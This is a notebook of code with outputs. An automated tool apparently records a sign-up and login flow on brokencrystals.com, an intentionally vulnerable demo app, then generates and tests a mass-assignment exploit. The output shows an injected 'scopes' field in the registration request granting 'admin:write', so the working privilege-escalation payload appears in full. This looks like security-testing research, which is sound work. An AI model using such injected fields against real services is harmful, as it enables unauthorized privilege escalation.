# %%
from devtools import pprint
from IPython.display import display, Markdown
import common
#from importlib import reload
#reload(common)

har, client = common.scopes_har()
display(Markdown(common.markdown_har(har)))
# Out:
# 📤 POST https://brokencrystals.com/api/users/basic
#    📥 201
#
# 📤 POST https://brokencrystals.com/api/auth/login
#    📥 201
#
# 📤 GET https://brokencrystals.com/api/users/me
#    📥 200
#
# 📤 GET https://brokencrystals.com/api/users/me
#    📥 200
# ```
# ➡️ 1. POST /api/users/basic
# ```
#
# ```json
# {
#   "email": "robo.ruckus@brightsec.com",
#   "firstName": "",
#   "lastName": "",
#   "company": "",
#   "phoneNumber": "",
#   "password": "000",
#   "op": "basic"
# }
# ```
# ```json
# ⬅️ 201
# {}
# ```
#
# ```
# ➡️ 2. POST /api/auth/login
# ```
#
# ```json
# {
#   "user": "robo.ruckus@brightsec.com",
#   "password": "000"
# }
# ```
# ```json
# ⬅️ 201
# {
#   "email": "robo.ruckus@brightsec.com"
# }
# ```
#
# ```
# ➡️ 3. GET /api/users/me
# ```
# ```json
# ⬅️ 200
# {
#   "email": "robo.ruckus@brightsec.com",
#   "firstName": "",
#   "lastName": "",
#   "company": "",
#   "phoneNumber": "",
#   "scopes": [
#     "user:read",
#     "user:write"
#   ]
# }
# ```
#
# ```
# ➡️ 4. GET /api/users/me
# ```
# ```json
# ⬅️ 200
# {
#   "email": "robo.ruckus@brightsec.com",
#   "firstName": "",
#   "lastName": "",
#   "company": "",
#   "phoneNumber": "",
#   "scopes": [
#     "user:read",
#     "user:write"
#   ]
# }
# ```

# %%
import extract_login

related_requests = extract_login.invoke(har["log"]["entries"])
pprint(related_requests)
# Out:
# RelevantEntries(
#     permission_verification=(
#         'User permissions are verified through scopes associated with the user account, which are checked during API r'
#         'equests.'
#     ),
#     entries=[
#         Entry(
#             request=Request(
#                 method='POST',
#                 path='/api/users/basic',
#                 query={},
#                 postData=(
#                     '{"email":"robo.ruckus@brightsec.com","firstName":"","lastName":"","company":"","phoneNumber":"","'
#                     'password":"000","op":"basic"}'
#                 ),
#             ),
#             response=Response(
#                 content='{}',
#                 status_code=201,
#             ),
#         ),
#         Entry(
#             request=Request(
#                 method='POST',
#                 path='/api/auth/login',
#                 query={},
#                 postData='{"user":"robo.ruckus@brightsec.com","password":"000"}',
#             ),
#             response=Response(
#                 content='{"email":"robo.ruckus@brightsec.com"}',
#                 status_code=201,
#             ),
#         ),
#         Entry(
#             request=Request(
#                 method='GET',
#                 path='/api/users/me',
#                 query={},
#                 postData='',
#             ),
#             response=Response(
#                 content=(
#                     '{"email":"robo.ruckus@brightsec.com","firstName":"","lastName":"","company":"","phoneNumber":"","'
#                     'scopes":["user:read","user:write"]}'
#                 ),
#                 status_code=200,
#             ),
#         ),
#     ],
# )

# %%
import vuala.massassignment.reproduce_login as reproduce_login

reproduced = reproduce_login.invoke(client, related_requests.entries)
pprint(reproduced)
# Out:
# Making a POST /api/users/basic request
#
#
#  {"email":"admin-bold-bird@brightsec.com","firstName":"","lastName":"","company":"","phoneNumber":"","password":"0
#  ","op":"basic"}
# <pre style="white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace">
#
# </pre>
# 📤 POST https://brokencrystals.com/api/users/basic
#    📥 201
# Response status: 201
#
#
#  {}
# <pre style="white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace">
#
# </pre>
# Making a POST /api/auth/login request
#
#
#  {"user":"admin-bold-bird@brightsec.com","password":"000"}
# <pre style="white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace">
#
# </pre>
# 📤 POST https://brokencrystals.com/api/auth/login
#    📥 201
# Response status: 201
#
#
#  {
#    "email": "admin-bold-bird@brightsec.com"
#  }
# <pre style="white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace">
#
# </pre>
# Making a GET /api/users/me request
# <pre style="white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace">
#
# </pre>
# 📤 GET https://brokencrystals.com/api/users/me
#    📥 200
# Response status: 200
#
#
#  {
#    "email": "admin-bold-bird@brightsec.com",
#    "firstName": "",
#    "lastName": "",
#    "company": "",
#    "phoneNumber": "",
#    "scopes": [
#      "user:read",
#      "user:write"
#    ]
#  }
# <pre style="white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace">
#
# </pre>
# [
#     Entry(
#         request=Request(
#             method='POST',
#             path='/api/users/basic',
#             query={},
#             postData=(
#                 '{"email":"admin-bold-bird@brightsec.com","firstName":"","lastName":"","company":"","phoneNumber":"","'
#                 'password":"000","op":"basic"}'
#             ),
#         ),
#         response=Response(
#             content='{}',
#             status_code=201,
#         ),
#     ),
#     Entry(
#         request=Request(
#             method='POST',
#             path='/api/auth/login',
#             query={},
#             postData='{"user":"admin-bold-bird@brightsec.com","password":"000"}',
#         ),
#         response=Response(
#             content='{"email": "admin-bold-bird@brightsec.com"}',
#             status_code=201,
#         ),
#     ),
#     Entry(
#         request=Request(
#             method='GET',
#             path='/api/users/me',
#             query={},
#             postData='',
#         ),
#         response=Response(
#             content=(
#                 '{"email": "admin-bold-bird@brightsec.com", "firstName": "", "lastName": "", "company": "", "phoneNumb'
#                 'er": "", "scopes": ["user:read", "user:write"]}'
#             ),
#             status_code=200,
#         ),
#     ),
# ]

# %%
import vuala.massassignment.get_resources as get_resources

resources = get_resources.invoke(related_requests.entries)
pprint(resources)
# Out:
# RestResources(
#     resources=[
#         Resource(
#             name='users',
#             fields=[
#                 'email',
#                 'firstName',
#                 'lastName',
#                 'company',
#                 'phoneNumber',
#                 'password',
#                 'scopes',
#             ],
#         ),
#         Resource(
#             name='auth',
#             fields=[
#                 'user',
#                 'password',
#             ],
#         ),
#     ],
# )

# %%
import vuala.massassignment.generate_and_test as generate_and_test
from vuala.output import write_markdown

exploit = generate_and_test.invoke(
        client,
        reproduced,
        related_requests.permission_verification,
        resources.resources,
    )
write_markdown(exploit.markdown())
# Out:
# Making a POST /api/users/basic request
#
#
#  {"email":"admin-bold-gecko@brightsec.com","firstName":"","lastName":"","company":"","phoneNumber":"","password":"
#  0","op":"basic","scopes":["admin:write"]}
# <pre style="white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace">
#
# </pre>
# 📤 POST https://brokencrystals.com/api/users/basic
#    📥 201
# Response status: 201
#
#
#  {}
# <pre style="white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace">
#
# </pre>
# Making a POST /api/auth/login request
#
#
#  {"user":"admin-bold-gecko@brightsec.com","password":"000"}
# <pre style="white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace">
#
# </pre>
# 📤 POST https://brokencrystals.com/api/auth/login
#    📥 201
# Response status: 201
#
#
#  {
#    "email": "admin-bold-gecko@brightsec.com"
#  }
# <pre style="white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace">
#
# </pre>
# Making a GET /api/users/me request
# <pre style="white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace">
#
# </pre>
# 📤 GET https://brokencrystals.com/api/users/me
#    📥 200
# Response status: 200
#
#
#  {
#    "email": "admin-bold-gecko@brightsec.com",
#    "firstName": "",
#    "lastName": "",
#    "company": "",
#    "phoneNumber": "",
#    "scopes": [
#      "admin:write"
#    ]
#  }
# <pre style="white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace">
#
# </pre>
# {"scopes":["admin:write"]}
#
#
#  ➡️ POST /api/users/basic
#
#
#
#  {
#    "email": "admin-bold-gecko@brightsec.com",
#    "firstName": "",
#    "lastName": "",
#    "company": "",
#    "phoneNumber": "",
#    "password": "000",
#    "op": "basic",
#    "scopes": [
#      "admin:write"
#    ]
#  }
#
#
# ⬅️ 201
#
#
#  {}
#
#
#
#  ➡️ POST /api/auth/login
#
#
#
#  {
#    "user": "admin-bold-gecko@brightsec.com",
#    "password": "000"
#  }
#
#
# ⬅️ 201
#
#
#  {
#    "email": "admin-bold-gecko@brightsec.com"
#  }
#
#
#
#  ➡️ GET /api/users/me
#
#
# ⬅️ 200
#
#
#  {
#    "email": "admin-bold-gecko@brightsec.com",
#    "firstName": "",
#    "lastName": "",
#    "company": "",
#    "phoneNumber": "",
#    "scopes": [
#      "admin:write"
#    ]
#  }
# <pre style="white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace">
#
# </pre>
